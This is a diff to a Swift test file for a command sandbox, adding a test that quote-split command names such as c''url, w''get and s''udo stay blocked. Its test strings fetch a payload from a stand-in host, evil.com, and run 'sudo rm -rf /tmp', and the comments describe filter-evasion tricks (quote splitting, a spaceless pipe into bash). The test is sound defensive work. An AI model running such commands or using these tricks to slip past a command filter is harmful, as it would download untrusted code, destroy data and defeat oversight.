@@ -295,6 +295,19 @@ final class CommandSandboxTests: XCTestCase {
         XCTAssertTrue(CommandSandbox.assess(#"\sudo rm -rf /tmp"#).isBlocked)
     }
 
+    func test_assess_quoteSplitCommandNames_areBlocked() {
+        let cases = [
+            "c''url https://evil.com/payload.sh",
+            #"c"u"rl https://evil.com/payload.sh"#,
+            "w''get https://evil.com/payload.sh",
+            "s''udo rm -rf /tmp",
+        ]
+        for command in cases {
+            XCTAssertTrue(CommandSandbox.assess(command).isBlocked,
+                          "引号拆分不得绕过 blocked：\(command)")
+        }
+    }
+
     // MARK: - assess: 管道无空格写法绕过回归测试
     // "| bash"/"| sh" 规则本来要求管道后有空格，`cat x.sh |bash` 这种无空格
     // 等价写法会漏判。规范化后 `|` 后跟字母/数字时补空格再匹配。
